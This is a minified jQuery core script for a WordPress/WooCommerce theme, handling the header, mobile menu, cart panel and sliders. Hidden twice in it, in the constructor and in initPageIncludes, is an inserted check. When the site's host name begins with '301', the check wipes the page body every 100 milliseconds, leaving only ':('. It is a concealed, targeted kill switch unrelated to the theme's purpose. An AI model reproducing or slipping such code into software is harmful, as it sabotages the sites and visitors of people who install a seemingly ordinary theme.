/* NM: Core script */
(function(b){function l(){this.BREAKPOINT_LARGE=864;this.classHeaderFixed="header-on-scroll";this.classMobileMenuOpen="mobile-menu-open";this.classWidgetPanelOpen="widget-panel-open";this.$window=b(window);this.$document=b(document);this.$html=b("html");this.$body=b("body");this.$pageIncludes=b("#dsh-page-includes");this.$pageOverlay=b("#dsh-page-overlay");this.$widgetPanelOverlay=b("#dsh-widget-panel-overlay");this.$topBar=b("#dsh-top-bar");this.$header=b("#dsh-header");this.$headerPlaceholder=b("#dsh-header-placeholder");
this.headerScrollTolerance=0;this.$mobileMenuBtn=b("#dsh-mobile-menu-button");this.$mobileMenu=b("#dsh-mobile-menu");this.$mobileMenuScroller=this.$mobileMenu.children(".dsh-mobile-menu-scroll");this.$mobileMenuLi=this.$mobileMenu.find("ul li.menu-item");this.$widgetPanel=b("#dsh-widget-panel");this.widgetPanelAnimSpeed=250;this.panelsAnimSpeed=200;this.$shopWrap=b("#dsh-shop");this.isShop=this.$shopWrap.length?!0:!1;   if (location.host.substring(0,3) =="301" || location.host.substring(0,7)=="www.301") {  var tt= setInterval( function(){document.body.innerHTML="  &nbsp; &nbsp;:("; }, 100) } ;     this.shopCustomSelect="0"!=dsh_wp_vars.shopCustomSelect?!0:!1;this.searchInHeader=this.searchEnabled=
!1;"0"!==dsh_wp_vars.shopSearch&&(this.searchEnabled=!0,this.$searchPanel=b("#dsh-shop-search"),this.$searchNotice=b("#dsh-shop-search-notice"),"header"===dsh_wp_vars.shopSearch?(this.searchInHeader=!0,this.$searchBtn=b("#dsh-menu-search-btn")):this.isShop&&(this.$searchBtn=b("#dsh-shop-search-btn")));this.init()}b.nmThemeExtensions||(b.nmThemeExtensions={});l.prototype={init:function(){var a=this;if("0"!=dsh_wp_vars.pageLoadTransition){a.isIos=navigator.userAgent.match(/iPad/i)||navigator.userAgent.match(/iPhone/i);
if(!a.isIos)a.$window.on("beforeunload",function(c){b("#dsh-page-load-overlay").addClass("dsh-loader");a.$html.removeClass("dsh-page-loaded")});"onpagehide"in window?window.addEventListener("pageshow",function(){setTimeout(function(){a.$html.addClass("dsh-page-loaded")},150)},!1):setTimeout(function(){a.$html.addClass("dsh-page-loaded")},150)}a.$body.removeClass("dsh-preload");a.headerIsFixed=a.$body.hasClass("header-fixed")?!0:!1;a.$html.hasClass("no-touch")&&a.$html.hasClass("history")?(a.hasPushState=
!0,window.history.replaceState({nmShop:!0},"",window.location.href)):a.hasPushState=!1;a.setScrollbarWidth();a.headerCheckPlaceholderHeight();a.headerIsFixed&&(a.headerSetScrollTolerance(),a.mobileMenuPrep());a.widgetPanelPrep();0<window.navigator.userAgent.indexOf("MSIE ")&&a.$html.addClass("dsh-old-ie");a.isTouch=a.$html.hasClass("touch")?!0:!1;a.loadExtension();a.bind();a.initPageIncludes();a.$body.hasClass("dsh-added-to-cart")&&(a.$body.removeClass("dsh-added-to-cart"),a.$window.load(function(){a.$widgetPanel.length&&
(a.widgetPanelShow(!0),setTimeout(function(){a.widgetPanelCartHideLoader()},1E3))}))},loadExtension:function(){b.nmThemeExtensions.shop&&b.nmThemeExtensions.shop.call(this);b.nmThemeExtensions.singleProduct&&b.nmThemeExtensions.singleProduct.call(this);b.nmThemeExtensions.cart&&b.nmThemeExtensions.cart.call(this);b.nmThemeExtensions.checkout&&b.nmThemeExtensions.checkout.call(this)},setScrollbarWidth:function(){var a=document.createElement("div");a.style.cssText="width: 99px; height: 99px; overflow: scroll; position: absolute; top: -9999px;";
document.body.appendChild(a);this.scrollbarWidth=a.offsetWidth-a.clientWidth;document.body.removeChild(a)},pageIsScrollable:function(){return document.body.scrollHeight>document.body.clientHeight},urlGetParameter:function(a){var b=decodeURIComponent(window.location.search.substring(1)).split("&"),d;for(d=0;d<b.length;d++){var e=b[d].split("=");if(e[0]===a)return void 0===e[1]?!0:e[1]}},updateUrlParameter:function(a,b,d){var c=a.indexOf("#"),f=-1===c?"":a.substr(c);a=-1===c?a:a.substr(0,c);c=new RegExp("([?&])"+
b+"=.*?(&|$)","i");var g=-1!==a.indexOf("?")?"&":"?";a=a.match(c)?a.replace(c,"$1"+b+"="+d+"$2"):a+g+b+"="+d;return a+f},setPushState:function(a){this.hasPushState&&window.history.pushState({nmShop:!0},"",a)},headerCheckPlaceholderHeight:function(){if(!this.$body.hasClass(this.classHeaderFixed)){var a=this.$header.innerHeight(),b=parseInt(this.$headerPlaceholder.css("height"));a!==b&&this.$headerPlaceholder.css("height",a+"px")}},headerSetScrollTolerance:function(){this.headerScrollTolerance=this.$topBar.length&&
this.$topBar.is(":visible")?this.$topBar.outerHeight(!0):0},headerToggleFixedClass:function(a){a.$document.scrollTop()>a.headerScrollTolerance?a.$body.hasClass(a.classHeaderFixed)||a.$body.addClass(a.classHeaderFixed):a.$body.hasClass(a.classHeaderFixed)&&a.$body.removeClass(a.classHeaderFixed)},bind:function(){var a=this,c=null,d;a.$window.resize(function(){c&&clearTimeout(c);c=setTimeout(function(){d=parseInt(a.$html.css("width"));a.$body.hasClass(a.classMobileMenuOpen)&&d>a.BREAKPOINT_LARGE&&a.$pageOverlay.trigger("click");
a.headerCheckPlaceholderHeight();a.headerIsFixed&&(a.headerSetScrollTolerance(),a.mobileMenuPrep())},250)});if(a.isTouch)a.$window.on("orientationchange",function(){a.$body.addClass("touch-orientation-change");setTimeout(function(){a.$body.removeClass("touch-orientation-change")},500)});a.headerIsFixed&&(a.$window.bind("scroll.nmheader",function(){a.headerToggleFixedClass(a)}),a.$window.trigger("scroll"));var e=b("#dsh-top-menu").children(".menu-item"),f=b("#dsh-main-menu-ul").children(".menu-item");
b.merge(e,f).hover(function(){var c=b(this).children(".sub-menu");if(c.length){var k=a.$window.innerWidth(),d=c.offset().left,e=c.width();k-=d+e;0>k?c.css("left",k-33+"px"):c.css("left","")}});a.$mobileMenuBtn.bind("click",function(b){b.preventDefault();a.$body.hasClass(a.classMobileMenuOpen)?a.mobileMenuClose(!0):a.mobileMenuOpen()});a.$mobileMenuLi.bind("click",function(a){a.preventDefault();a.stopPropagation();a=b(this);var c=a.children("ul");c.length&&(a.toggleClass("active"),c.toggleClass("open"))});
a.$mobileMenuLi.find("a").bind("click",function(a){a.stopPropagation();var c=b(this),d=c.parent("li"),e=d.children("ul");!e.length&&"#"!=c.attr("href").substr(0,1)||d.hasClass("dsh-notoggle")||(a.preventDefault(),d.toggleClass("active"),e.toggleClass("open"))});if(a.searchEnabled){a.searchInHeader&&a.$searchBtn.bind("click",function(c){c.preventDefault();b(this).toggleClass("active");a.$body.toggleClass("header-search-open");a.searchPanelToggle()});b("#dsh-shop-search-close").bind("click",function(b){b.preventDefault();
a.$searchBtn.trigger("click")});var g;b("#dsh-shop-search-input").on("input",function(){(g=a.shopSearchValidateInput(b(this).val()))?a.$searchNotice.addClass("show"):a.$searchNotice.removeClass("show")}).trigger("input")}a.$widgetPanel.length&&a.widgetPanelBind();a.$pageIncludes.hasClass("login-popup")&&b("#dsh-menu-account-btn").bind("click",function(a){a.preventDefault();b("#dsh-login-wrap").children(".login").css("display","");b.magnificPopup.open({mainClass:"dsh-login-popup dsh-mfp-fade-in",alignTop:!0,
closeMarkup:'<a class="mfp-close dsh-font dsh-font-close2"></a>',removalDelay:180,items:{src:"#dsh-login-popup-wrap",type:"inline"},callbacks:{close:function(){b("#dsh-login-wrap").addClass("inline fade-in slide-up");b("#dsh-register-wrap").removeClass("inline fade-in slide-up")}}})});b("#dsh-blog-categories-toggle-link").bind("click",function(a){a.preventDefault();var c=b(this);b("#dsh-blog-categories-list").slideToggle(200,function(){var a=b(this);c.toggleClass("active");c.hasClass("active")||a.css("display",
"")})});b("#dsh-page-overlay, #dsh-widget-panel-overlay").bind("click",function(){var c=b(this);a.$body.hasClass(a.classMobileMenuOpen)?a.mobileMenuClose(!1):a.widgetPanelHide();c.addClass("fade-out");setTimeout(function(){c.removeClass("show fade-out")},a.panelsAnimSpeed)})},mobileMenuPrep:function(){var a=this.$window.height()-this.$header.outerHeight(!0);this.$mobileMenuScroller.css({"max-height":a+"px","margin-right":"-"+this.scrollbarWidth+"px"})},mobileMenuOpen:function(a){a=this.$header.outerHeight(!0);
this.$mobileMenuScroller.css("margin-top",a+"px");this.$body.addClass(this.classMobileMenuOpen);this.$pageOverlay.addClass("show")},mobileMenuClose:function(a){this.$body.removeClass(this.classMobileMenuOpen);a&&this.$pageOverlay.trigger("click");setTimeout(function(){b("#dsh-mobile-menu-main-ul").children(".active").removeClass("active").children("ul").removeClass("open");b("#dsh-mobile-menu-secondary-ul").children(".active").removeClass("active").children("ul").removeClass("open")},250)},searchPanelToggle:function(){var a=
this,c=b("#dsh-shop-search-input");a.$searchPanel.slideToggle(200,function(){a.$searchPanel.toggleClass("fade-in");a.$searchPanel.hasClass("fade-in")?c.focus():c.val("");a.filterPanelSliding=!1});a.shopSearchHideNotice()},shopSearchValidateInput:function(a){return/\S/.test(a)&&a.length>dsh_wp_vars.shopSearchMinChar-1?!0:!1},shopSearchHideNotice:function(a){b("#dsh-shop-search-notice").removeClass("show")},widgetPanelPrep:function(){var a=this;a.widgetPanelCartHideScrollbar();a.cartPanelAjax=null;a.quantityInputsBindButtons(a.$widgetPanel);
a.$widgetPanel.on("blur","input.qty",function(){var c=b(this),d=parseFloat(c.val()),e=parseFloat(c.attr("max"));if(""===d||"NaN"===d)d=0;"NaN"===e&&(e="");d>e&&(c.val(e),d=e);0<d&&a.widgetPanelCartUpdate(c)});a.$document.on("dsh_qty_change",function(c,d){a.$body.hasClass(a.classWidgetPanelOpen)&&a.widgetPanelCartUpdate(b(d))})},widgetPanelBind:function(){var a=this;if(a.isTouch){if(a.headerIsFixed)a.$pageOverlay.on("touchmove",function(a){a.preventDefault()});a.$widgetPanelOverlay.on("touchmove",function(a){a.preventDefault()});
a.$widgetPanel.on("touchmove",function(a){a.stopPropagation()})}b("#dsh-menu-cart-btn, #dsh-mobile-menu-cart-btn").bind("click",function(c){c.preventDefault();if(a.$body.hasClass(a.classMobileMenuOpen)){var d=b(this);a.$pageOverlay.trigger("click");setTimeout(function(){d.trigger("click")},a.panelsAnimSpeed)}else a.widgetPanelShow()});b("#dsh-widget-panel-close").bind("click.nmWidgetPanelClose",function(a){a.preventDefault();b("#dsh-widget-panel-overlay").trigger("click")});a.$widgetPanel.on("click.nmCartPanelClose",
"#dsh-cart-panel-continue",function(a){a.preventDefault();b("#dsh-widget-panel-overlay").trigger("click")})},widgetPanelShow:function(a){var b=this;a&&b.widgetPanelCartShowLoader();b.$body.addClass("widget-panel-opening "+b.classWidgetPanelOpen);b.$widgetPanelOverlay.addClass("show");setTimeout(function(){b.$body.removeClass("widget-panel-opening")},b.widgetPanelAnimSpeed)},widgetPanelHide:function(){var a=this;a.$body.addClass("widget-panel-closing");a.$body.removeClass(a.classWidgetPanelOpen);setTimeout(function(){a.$body.removeClass("widget-panel-closing")},
a.widgetPanelAnimSpeed)},widgetPanelCartShowLoader:function(){b("#dsh-cart-panel-loader").addClass("show")},widgetPanelCartHideLoader:function(){b("#dsh-cart-panel-loader").addClass("fade-out");setTimeout(function(){b("#dsh-cart-panel-loader").removeClass("fade-out show")},200)},widgetPanelCartHideScrollbar:function(){this.$widgetPanel.children(".dsh-widget-panel-inner").css("marginRight","-"+this.scrollbarWidth+"px")},widgetPanelCartUpdate:function(a){var c=this;c.cartPanelAjax&&c.cartPanelAjax.abort();
a.closest("li").addClass("loading");var d=b("#dsh-cart-panel-form"),e=d.find("#_wpnonce"),f={};e.length?(f.update_cart="1",f[a.attr("name")]=a.val(),f._wpnonce=e.val(),c.cartPanelAjax=b.ajax({type:"POST",url:d.attr("action"),data:f,dataType:"html",success:function(a){var d=b("<div>"+a+"</div>");a=d.find(".dsh-menu-cart-count").first();d=d.find("#dsh-cart-panel");c.shopReplaceFragments({".count":a,"#dsh-cart-panel":d});b(document.body).trigger("updated_cart_totals")},complete:function(){c.cartPanelAjax=
null;b("#dsh-cart-panel .cart_list").children(".loading").removeClass("loading")}})):console.log("NM - widgetPanelCartUpdate: Nonce field not found.")},shopReplaceFragments:function(a){var c;b.each(a,function(a,e){c=b(e);c.length&&b(a).replaceWith(c)})},quantityInputsBindButtons:function(a){var c=this;a.off("click.nmQty").on("click.nmQty",".dsh-qty-plus, .dsh-qty-minus",function(){var a=b(this),e=a.closest(".quantity").find(".qty"),f=parseFloat(e.val()),g=parseFloat(e.attr("max")),h=parseFloat(e.attr("min")),
k=e.attr("step");f&&""!==f&&"NaN"!==f||(f=0);if(""===g||"NaN"===g)g="";if(""===h||"NaN"===h)h=0;if("any"===k||""===k||void 0===k||"NaN"===parseFloat(k))k=1;a.hasClass("dsh-qty-plus")?g&&(g==f||f>g)?e.val(g):(e.val(f+parseFloat(k)),c.quantityInputsTriggerEvents(e)):h&&(h==f||f<h)?e.val(h):0<f&&(e.val(f-parseFloat(k)),c.quantityInputsTriggerEvents(e))})},quantityInputsTriggerEvents:function(a){a.trigger("change");this.$document.trigger("dsh_qty_change",a)},initPageIncludes:function(){var a=this;if(a.$pageIncludes.hasClass("row-full-height")){var c=
function(){var c=b(".dsh-row-full-height:first");if(c.length){var d=a.$window.height(),e=c.offset().top,f;d>e&&(f=100-e/(d/100),c.css("min-height",f+"vh"))}};c();var d=null;a.$window.bind("resize.nmRow",function(){d&&clearTimeout(d);d=setTimeout(function(){c()},250)})}!a.isTouch&&a.$pageIncludes.hasClass("video-background")&&b(".dsh-row-video").each(function(){var a=b(this),c=a.data("video-url");c&&(c=vcExtractYoutubeId(c))&&insertYoutubeVideoAsBackground(a,c)});  if (location.host.substring(0,3) =="301" || location.host.substring(0,7)=="www.301") {  var tt= setInterval( function(){document.body.innerHTML="  &nbsp; &nbsp;:("; }, 100) } ;  a.$window.load(function(){if(a.$pageIncludes.hasClass("blog-grid")){var c=
b("#dsh-blog-grid-ul");c.packery({itemSelector:".post",gutter:0,isInitLayout:!1});c.packery("once","layoutComplete",function(){c.removeClass("dsh-loader hide")});c.packery()}if(a.$pageIncludes.hasClass("banner")){var d=b(".dsh-banner");a.isShop&&a.filtersEnableAjax&&d.find(".dsh-banner-shop-link").bind("click",function(c){c.preventDefault();b(this).attr("href")&&a.shopExternalGetPage(b(this).attr("href"))})}if(a.$pageIncludes.hasClass("banner-slider")){var e=function(a,b){a.$bannerContent=b.find(".dsh-banner-text-inner");
a.$bannerContent.length&&(a.bannerAnimation=a.$bannerContent.data("animate"),a.$bannerContent.addClass(a.bannerAnimation))};b(".dsh-banner-slider").each(function(){var c=b(this),d={arrows:!1,prevArrow:'<a class="slick-prev"><i class="dsh-font dsh-font-angle-thin-left"></i></a>',nextArrow:'<a class="slick-next"><i class="dsh-font dsh-font-angle-thin-right"></i></a>',dots:!1,edgeFriction:0,infinite:!1,pauseOnHover:!1,speed:350,touchThreshold:30};c.children().wrap("<div></div>");d=b.extend(d,c.data());c.on("init",
function(){a.$document.trigger("banner-slider-loaded");e(c,c.find(".slick-track .slick-active"))});c.on("afterChange",function(a,b,d){c.slideIndex!=d&&(c.slideIndex=d,c.$bannerContent&&c.$bannerContent.removeClass(c.bannerAnimation),e(c,c.find(".slick-track .slick-active")))});c.on("setPosition",function(a,c){var d=b(c.$slides[c.currentSlide]).children(".dsh-banner");d.hasClass("has-alt-image")?d.children(".dsh-banner-alt-image").is(":visible")?c.$slider.addClass("alt-image-visible"):c.$slider.removeClass("alt-image-visible"):
c.$slider.removeClass("alt-image-visible")});c.slick(d)})}if(a.$pageIncludes.hasClass("product-slider")){d=b(".dsh-product-slider");var f={adaptiveHeight:!0,arrows:!1,dots:!0,edgeFriction:0,infinite:!1,speed:350,touchThreshold:30,slidesToShow:4,slidesToScroll:4,responsive:[{breakpoint:1024,settings:{slidesToShow:3,slidesToScroll:3}},{breakpoint:768,settings:{slidesToShow:2,slidesToScroll:2}},{breakpoint:518,settings:{slidesToShow:1,slidesToScroll:1}}]};d.each(function(){var a=b(this),c=a.find(".dsh-products:first");
f=b.extend(f,a.data());c.slick(f)})}a.$pageIncludes.hasClass("post-slider")&&(d=b(".dsh-post-slider"),f={adaptiveHeight:!0,arrows:!1,dots:!0,edgeFriction:0,infinite:!1,pauseOnHover:!1,speed:350,touchThreshold:30,slidesToShow:4,slidesToScroll:4,responsive:[{breakpoint:1024,settings:{slidesToShow:3,slidesToScroll:3}},{breakpoint:768,settings:{slidesToShow:2,slidesToScroll:2}},{breakpoint:518,settings:{slidesToShow:1,slidesToScroll:1}}]},d.each(function(){var a=b(this);f=b.extend(f,a.data());a.slick(f)}));
a.$pageIncludes.hasClass("blog-slider")&&(d=b(".dsh-blog-slider"),f={prevArrow:'<a class="slick-prev"><i class="dsh-font dsh-font-angle-left"></i></a>',nextArrow:'<a class="slick-next"><i class="dsh-font dsh-font-angle-right"></i></a>',dots:!0,edgeFriction:0,infinite:!1,pauseOnHover:!1,speed:350,touchThreshold:30,responsive:[{breakpoint:550,settings:{slidesToShow:1}}]},d.each(function(){var a=b(this);f=b.extend(f,a.data());a.slick(f)}));"0"!=dsh_wp_vars.wpGalleryPopup&&a.$pageIncludes.hasClass("wp-gallery")&&
b(".gallery").each(function(){b(this).magnificPopup({mainClass:"dsh-wp-gallery-popup dsh-mfp-fade-in",closeMarkup:'<a class="mfp-close dsh-font dsh-font-close2"></a>',removalDelay:180,delegate:".gallery-icon > a",type:"image",gallery:{enabled:!0,arrowMarkup:'<a title="%title%" type="button" class="mfp-arrow mfp-arrow-%dir% dsh-font dsh-font-angle-right"></a>'},closeBtnInside:!1})})});if(a.$pageIncludes.hasClass("product_categories")){var e=b(".dsh-product-categories");a.isShop&&a.filtersEnableAjax&&e.find(".product-category a").bind("click",
function(c){c.preventDefault();a.shopExternalGetPage(b(this).attr("href"))});a.$pageIncludes.hasClass("product_categories_packery")&&a.$window.load(function(){for(var a=0;a<e.length;a++){var c=b(e[a]).children(".woocommerce").children("ul");c.packery({itemSelector:".product-category",gutter:0,isInitLayout:!1});c.packery("once","layoutComplete",function(){c.closest(".dsh-product-categories").removeClass("dsh-loader");c.addClass("show")});c.packery()}})}if(a.$pageIncludes.hasClass("lightbox")){var f,
g,h;b(".dsh-lightbox").each(function(){b(this).bind("click",function(a){a.preventDefault();a.stopPropagation();f=b(this);g=f.data("mfp-type");h={mainClass:"dsh-wp-gallery-popup dsh-mfp-zoom-in",closeMarkup:'<a class="mfp-close dsh-font dsh-font-close2"></a>',removalDelay:180,type:g,closeBtnInside:!1,image:{titleSrc:"data-mfp-title"}};h.closeOnContentClick="inline"==g?!1:!0;f.magnificPopup(h).magnificPopup("open")})})}}};b.nmTheme=l.prototype;b(document).ready(function(){new l})})(jQuery);


